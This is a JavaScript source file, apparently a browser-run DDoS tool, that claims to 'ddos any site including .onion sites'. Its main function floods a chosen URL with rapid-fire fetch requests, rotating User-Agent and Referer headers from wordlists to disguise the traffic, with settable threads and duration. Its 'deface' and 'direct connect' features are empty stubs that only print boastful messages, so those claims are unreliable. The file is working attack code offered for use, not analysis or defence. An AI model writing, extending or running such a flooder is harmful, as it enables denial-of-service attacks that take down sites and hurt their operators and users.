// ddos any site including .onion sites
// USE referers.txt AND useragents.txt

async function ddosAttack(target, type = 'http', duration = 60, threads = 100, deface = false, connect = false, customHeaders = '') {
  if (!target) {
    log('ERROR: Target URL is required.');
    return;
  }

  log(`Initiating ${type.toUpperCase()} DDoS attack on ${target} for ${duration} seconds with ${threads} threads.`);

  if (deface) {
    log('Defacing target... Get ready for chaos!');
    defaceWebsite(target);
  }

  if (connect) {
    log('Establishing direct connection... Prepare for intrusion!');
    directConnect(target);
  }

  const referers = await loadFile('referers.txt');
  const userAgents = await loadFile('useragents.txt');

  if (!referers || !userAgents) {
    log('ERROR: Could not load referers.txt or useragents.txt. Make sure these files exist.');
    return;
  }

  let parsedCustomHeaders = {};
  if (customHeaders) {
    try {
      parsedCustomHeaders = JSON.parse(customHeaders);
    } catch (e) {
      log('ERROR: Invalid JSON format for custom headers. Ignoring.');
    }
  }

  const attackStartTime = Date.now();
  let attackInterval = null;

  if (type === 'http' || type === 'onion') {
    attackInterval = setInterval(() => {
      for (let i = 0; i < threads; i++) {
        const headers = {
          'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
          'Referer': referers[Math.floor(Math.random() * referers.length)],
          ...parsedCustomHeaders,
        };

        fetch(target, {
          method: 'GET', // or 'POST'
          mode: 'no-cors',
          headers: headers,
        }).then(response => {
          // Log success or failure (optional)
          //console.log(`Request sent: ${response.status}`);
        }).catch(error => {
          // Log error
          //console.error('Request error:', error);
        });
      }
    }, 0); // Run as fast as possible
  } else {
    log(`ERROR: Invalid attack type: ${type}. Choose 'http' or 'onion'.`);
    clearInterval(attackInterval);
    return;
  }

  setTimeout(() => {
    clearInterval(attackInterval);
    log('DDoS attack finished.');
  }, duration * 1000);
}

async function loadFile(filename) {
  try {
    const response = await fetch(filename);
    const text = await response.text();
    return text.split('\n').filter(line => line.trim() !== '');
  } catch (error) {
    log(`ERROR: Could not load file ${filename}: ${error}`);
    return null;
  }
}

function log(message) {
  const logsElement = document.getElementById('logs');
  if (logsElement) {
    logsElement.innerHTML += message + '<br>';
    logsElement.scrollTop = logsElement.scrollHeight; // Auto-scroll
  } else {
    console.log(message);
  }
}

function defaceWebsite(target) {
  // In reality, this would involve finding vulnerabilities
  // and injecting malicious code to alter the website's content.
  // This is just a placeholder.

  log(`Attempting to deface ${target}... Injecting HACKED message!`);
  // This is just an example.  Real defacing requires serious exploit knowledge.
}

function directConnect(target) {
  //  Attempt to establish a direct connection to the target server.
  //  This is a placeholder and does not implement actual connection attempts.

  log(`Attempting direct connection to ${target}... Initiating intrusion!`);
  // Real direct connections require serious hacking knowledge.
}

// Expose the ddosAttack function globally (for calling from HTML)
window.ddosAttack = ddosAttack;